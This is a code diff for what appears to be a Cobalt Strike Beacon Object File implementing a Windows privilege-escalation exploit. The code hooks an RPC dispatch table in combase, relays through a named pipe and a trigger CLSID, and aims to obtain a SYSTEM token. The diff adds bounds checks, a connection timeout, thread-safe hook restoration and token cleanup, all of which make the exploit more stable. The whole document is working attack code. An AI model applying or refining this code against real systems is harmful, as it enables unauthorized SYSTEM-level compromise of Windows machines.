@@ -240,7 +240,7 @@ static void* hook_ptr_storage;
 static int is_hook;
 static int is_start;
 static DWORD dispatch_table_old_protect;
-static HANDLE system_token;
+static volatile HANDLE system_token;
 static volatile int pipe_connected;
  static int token_type_index = -1;
  static GUID trigger_clsid;
@@ -580,6 +580,7 @@ static void print_usage(void)
  {
 	 const WCHAR* endpoints[] = { client_pipe, client_pipe_extra };
 	 int entry_size = 3;
+	 if (!ppdsaNewBindings) return -1;
 	 int memory_size;
 	 size_t i, j;
 	 short* pdsa;
@@ -636,6 +637,9 @@ static void print_usage(void)
  {
 	 int occ[512];
 	 size_t i, j;
+	 /* Guard: unsigned underflow if text is shorter than pattern */
+	 if (!text || !pattern || pattern_len == 0 || text_len < pattern_len)
+		 return -1;
 	 for (i = 0; i < 512; i++) occ[i] = -1;
 	 for (i = 0; i < pattern_len; i++) occ[pattern[i] & 0xff] = (int)i;
 	 i = 0;
@@ -644,8 +648,12 @@ static void print_usage(void)
 		 while (j < pattern_len && text[i + j] == pattern[j]) j++;
 		 if (j == pattern_len) return (int)i;
 		 i += pattern_len;
-		 if (i < text_len) i -= occ[text[i] & 0xff];
-		 if (i < 0) i = 0;
+		 /* occ[] value is signed; subtract may wrap i — clamp to text_len to stay in bounds */
+		 if (i < text_len) {
+			 int adj = occ[text[i] & 0xff];
+			 if (adj >= 0 && (size_t)adj <= i)
+				 i -= (size_t)adj;
+		 }
 	 }
 	 return -1;
  }
@@ -734,7 +742,17 @@ static void print_usage(void)
 		 BeaconPrintf(CALLBACK_ERROR, "[!] DispatchTableCount is %d\n", n);
 		 return -1;
 	 }
-	 use_protseq_param_count = *(unsigned char*)((char*)midl.ProcString + (unsigned)fmt_ptr[0] + 19);
+	 {
+		 unsigned char* pstr = (unsigned char*)midl.ProcString;
+		 unsigned proc_off  = (unsigned)(unsigned short)fmt_ptr[0];
+		 /* Ensure the byte we need is inside the mapped combase image */
+		 if (pstr &&
+			 (size_t)(pstr - (unsigned char*)combase_base) < combase_size &&
+			 proc_off + 19 < combase_size - (size_t)(pstr - (unsigned char*)combase_base))
+			 use_protseq_param_count = pstr[proc_off + 19];
+		 else
+			 use_protseq_param_count = 4; /* safe fallback */
+	 }
 	 if (use_protseq_param_count < 4 || use_protseq_param_count > 14) use_protseq_param_count = 4;
 	LOGI(
 		"[*] init_context: dispatch_count=%lu proc_fmt_off=%d param_count=%u\n",
@@ -766,10 +784,13 @@ static void restore_rpc(void)
 {
 	 if (is_hook && use_protseq_ptr) {
 		 DWORD old;
-		 api.pVirtualProtect(dispatch_table_ptr, (SIZE_T)PTR_SIZE, PAGE_READWRITE, &old);
-		 *(void**)dispatch_table_ptr = use_protseq_ptr;
-		 if (dispatch_table_old_protect)
-			 api.pVirtualProtect(dispatch_table_ptr, (SIZE_T)PTR_SIZE, dispatch_table_old_protect, &old);
+		 if (api.pVirtualProtect(dispatch_table_ptr, (SIZE_T)PTR_SIZE, PAGE_READWRITE, &old)) {
+			 *(void**)dispatch_table_ptr = use_protseq_ptr;
+			 if (dispatch_table_old_protect)
+				 api.pVirtualProtect(dispatch_table_ptr, (SIZE_T)PTR_SIZE, dispatch_table_old_protect, &old);
+		 } else {
+			 BeaconPrintf(CALLBACK_ERROR, "[!] restore_rpc: VirtualProtect failed, hook not removed\n");
+		 }
 	 }
 	 is_hook = 0;
 	 dispatch_table_old_protect = 0;
@@ -861,6 +882,12 @@ static void restore_rpc(void)
  
 	 OVERLAPPED ov = { 0 };
 	 ov.hEvent = api.pCreateEventW(NULL, TRUE, FALSE, NULL);
+	 if (!ov.hEvent) {
+		 BeaconPrintf(CALLBACK_ERROR, "[!] CreateEventW failed\n");
+		 api.pCloseHandle(pipe_handle);
+		 pipe_connected = -1;
+		 return 1;
+	 }
 	 if (!api.pConnectNamedPipe(pipe_handle, &ov)) {
 		 DWORD err = api.pGetLastError();
 		LOGI( "[*] ConnectNamedPipe initial status=%lu (0x%08lx)\n",
@@ -1881,8 +1908,9 @@ static void restore_rpc(void)
 	 }
  
 	 {
+		 /* Hard timeout: 300 x 100 ms = 30 seconds. */
 		 int wait_iterations = 0;
-		 while (!pipe_connected) {
+		 while (!pipe_connected && wait_iterations < 300) {
 			 if ((wait_iterations % 20) == 0) {
 				 LOGI(
 					 "[*] waiting for pipe connection: state=%d token=%p iter=%d\n",
@@ -1890,6 +1918,10 @@ static void restore_rpc(void)
 			 }
 			 api.pSleep(100);
 			 wait_iterations++;
+		 }
+		 if (!pipe_connected) {
+			 BeaconPrintf(CALLBACK_ERROR, "[!] Timed out waiting for pipe connection\n");
+			 pipe_connected = -1;
 		 }
 	 }
 	 LOGK( "[*] pipe_connected=%d\n", pipe_connected);
@@ -1929,8 +1961,11 @@ static void restore_rpc(void)
 		 BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get SYSTEM token\n");
  
  cleanup:
-	 restore_rpc();
+	 /* stop_pipe() unblocks the pipe server thread so it exits promptly. */
 	 stop_pipe();
+	 /* Join threads BEFORE restoring the hook — the trigger thread may still
+	    be dispatching through the hooked function pointer. Removing the hook
+	    while a thread is inside it is a race condition. */
 	 if (hTriggerThread) {
 		 api.pWaitForSingleObject(hTriggerThread, 10000);
 		 api.pCloseHandle(hTriggerThread);
@@ -1938,6 +1973,14 @@ static void restore_rpc(void)
 	 if (hPipeThread) {
 		 api.pWaitForSingleObject(hPipeThread, 10000);
 		 api.pCloseHandle(hPipeThread);
+	 }
+	 /* Restore the hook only after all threads have stopped. */
+	 restore_rpc();
+	 /* Safety net: close system_token if a thread set it after we stopped waiting
+	    (e.g. early goto cleanup before the token-use block). */
+	 if (system_token) {
+		 api.pCloseHandle((HANDLE)system_token);
+		 system_token = NULL;
 	 }
  }
  
